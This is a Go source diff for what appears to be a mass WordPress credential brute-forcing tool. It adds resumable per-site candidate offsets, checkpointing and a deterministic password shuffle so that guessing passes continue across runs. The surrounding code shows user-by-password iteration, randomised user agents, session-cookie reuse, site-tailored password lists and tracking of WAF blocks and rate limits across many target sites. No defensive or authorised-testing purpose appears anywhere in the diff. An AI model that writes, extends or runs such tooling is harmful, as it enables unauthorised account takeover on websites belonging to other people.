@@ -6,6 +6,7 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
+	"hash/fnv"
 	"math/rand"
 	"net"
 	"net/url"
@@ -208,6 +209,7 @@ type SiteJob struct {
 	Aliases   []string // input URLs replaced by a scheme fallback, checkpointed with the job
 	Cookies   string   // session cookies from the pre-flight GET, reused for every attempt
 	UserAgent string
+	Offset    int // candidate index to resume from (breadth passes)
 	Users     []string
 	Passwords []string
 
@@ -231,6 +233,9 @@ func (j *SiteJob) stop(reason string) {
 	}
 }
 
+// queuedInt is the number of candidates handed to the queue so far.
+func (j *SiteJob) queuedInt() int { return int(j.queued.Load()) }
+
 // done is true once no worker still holds an attempt for this job.
 func (j *SiteJob) done() bool {
 	if j.inflight.Load() != 0 {
@@ -252,7 +257,7 @@ func (j *SiteJob) outcome() string {
 		}
 		return "cancelled"
 	}
-	if *maxAttempts > 0 && j.queued.Load() >= int64(*maxAttempts) {
+	if *maxAttempts > 0 && j.queued.Load() >= int64(*maxAttempts)-int64(j.Offset) {
 		return "attempt_limit"
 	}
 	return "candidates_exhausted"
@@ -283,8 +288,9 @@ var (
 	workerStop   chan struct{}
 	workerWg     sync.WaitGroup
 
-	progressMu  sync.Mutex
-	progressOut *os.File
+	progressMu    sync.Mutex
+	progressOut   *os.File
+	resumeOffsets = map[string]int{}
 
 	pidPath string
 
@@ -363,22 +369,26 @@ func main() {
 	}
 
 	// Resume: skip sites already checkpointed as finished in previous runs.
-	// Rows are "site<TAB>status"; bare legacy rows count as finished. Sites
-	// that ended in a transient state (network, WAF, slow, ...) are requeued
-	// instead of being lost forever.
+	// Rows are "site<TAB>status<TAB>offset"; bare legacy rows count as
+	// finished. Sites that ended in a transient state (network, WAF, slow,
+	// attempt cap) are requeued instead of being lost forever; an attempt cap
+	// also remembers where the deeper pass has to continue.
 	if !*noResume {
 		if done := loadProgress(*progressFile); len(done) > 0 {
 			before := len(sites)
 			var remaining []string
 			retried := 0
 			for _, s := range sites {
-				st, seen := done[s]
+				e, seen := done[s]
 				switch {
 				case !seen:
 					remaining = append(remaining, s)
-				case retryableStatus(st):
+				case retryableStatus(e.status):
 					remaining = append(remaining, s)
 					retried++
+					if e.offset > 0 {
+						resumeOffsets[s] = e.offset
+					}
 				}
 			}
 			sites = remaining
@@ -534,9 +544,9 @@ func main() {
 				outcome := j.outcome()
 				stats.completed.Add(1)
 				recordOutcome(outcome)
-				markDone(j.Site, outcome)
+				markDone(j.Site, outcome, j.Offset+j.queuedInt())
 				for _, alias := range j.Aliases {
-					markDone(alias, outcome)
+					markDone(alias, outcome, j.Offset+j.queuedInt())
 				}
 				if *debugFlag {
 					logPrintf("[DONE] %s: %s (%d attempts)\n", j.Site, outcome, j.queued.Load())
@@ -959,7 +969,7 @@ func prepareJob(site string) *SiteJob {
 		stats.skipped.Add(1)
 		stats.completed.Add(1)
 		recordOutcome(reason)
-		markDone(site, reason)
+		markDone(site, reason, 0)
 		if *debugFlag {
 			logPrintf("[SKIP] %s: %s\n", site, reason)
 		}
@@ -973,6 +983,7 @@ func prepareJob(site string) *SiteJob {
 	}
 	job := &SiteJob{
 		Site:      working,
+		Offset:    resumeOffsets[site],
 		Cookies:   cookies,
 		UserAgent: randomUA(),
 		Users:     users,
@@ -994,15 +1005,28 @@ func feedAttempts(j *SiteJob) {
 	defer j.fed.Store(true)
 	batch := make([]*Attempt, 0, 256) // batch size
 
+	// A job resumed by a later breadth pass starts at Offset; the attempt cap
+	// is absolute, so only the remaining budget is fed.
+	limit := int64(-1)
+	if *maxAttempts > 0 {
+		limit = int64(*maxAttempts) - int64(j.Offset)
+	}
+	idx := 0
 	for _, u := range j.Users {
 		for _, p := range j.Passwords {
+			if idx < j.Offset {
+				idx++
+				continue
+			}
+			idx++
+
 			if j.stopped.Load() {
 				if len(batch) > 0 {
 					enqueueBatch(j, batch)
 				}
 				return
 			}
-			if *maxAttempts > 0 && j.queued.Load() >= int64(*maxAttempts) {
+			if limit >= 0 && j.queued.Load() >= limit {
 				if len(batch) > 0 {
 					enqueueBatch(j, batch)
 				}
@@ -1687,22 +1711,34 @@ func memoryWatchdog() {
 // loadProgress reads the checkpoint file and returns the recorded outcome per
 // site. Rows are "site<TAB>status"; bare rows from older versions count as
 // finished.
-func loadProgress(path string) map[string]string {
+type progressEntry struct {
+	status string
+	offset int
+}
+
+func loadProgress(path string) map[string]progressEntry {
 	data, err := os.ReadFile(path)
 	if err != nil {
 		return nil
 	}
-	done := make(map[string]string)
+	done := make(map[string]progressEntry)
 	for _, line := range strings.Split(string(data), "\n") {
 		line = strings.TrimSpace(line)
 		if line == "" {
 			continue
 		}
-		site, status, ok := strings.Cut(line, "\t")
-		if !ok {
-			status = "done"
+		parts := strings.Split(line, "\t")
+		site := parts[0]
+		e := progressEntry{status: "done"}
+		if len(parts) > 1 {
+			e.status = parts[1]
 		}
-		done[site] = status
+		if len(parts) > 2 {
+			if n, err := strconv.Atoi(parts[2]); err == nil && n > 0 {
+				e.offset = n
+			}
+		}
+		done[site] = e
 	}
 	return done
 }
@@ -1714,7 +1750,7 @@ func retryableStatus(status string) bool {
 		return false
 	}
 	switch status {
-	case "", "done", "verified_success", "not_wordpress", "candidates_exhausted", "attempt_limit":
+	case "", "done", "verified_success", "not_wordpress", "candidates_exhausted":
 		return false
 	case "cancelled", "network_error", "slow", "blocked", "rate_limited", "unavailable":
 		return true
@@ -1726,14 +1762,18 @@ func retryableStatus(status string) bool {
 // and fsyncs immediately. fsync is the key: the kernel flushes the write to
 // disk before we continue, so even a SIGKILL (OOM) right after this call can't
 // lose it.
-func markDone(site, status string) {
+func markDone(site, status string, offset int) {
 	if status == "" {
 		status = "done"
 	}
 	progressMu.Lock()
 	defer progressMu.Unlock()
 	if progressOut != nil {
-		progressOut.WriteString(site + "\t" + status + "\n")
+		if offset > 0 {
+			fmt.Fprintf(progressOut, "%s\t%s\t%d\n", site, status, offset)
+		} else {
+			progressOut.WriteString(site + "\t" + status + "\n")
+		}
 		progressOut.Sync()
 	}
 }
@@ -1991,7 +2031,12 @@ func generateSitePasswords(basePasswords []string, site string, users []string) 
 		}
 	}
 
-	rand.Shuffle(len(others), func(i, j int) {
+	// Deterministic order per site: breadth passes resume at a candidate
+	// offset, which is only meaningful if regeneration yields the same order.
+	h := fnv.New64a()
+	h.Write([]byte(site))
+	r := rand.New(rand.NewSource(int64(h.Sum64())))
+	r.Shuffle(len(others), func(i, j int) {
 		others[i], others[j] = others[j], others[i]
 	})
 
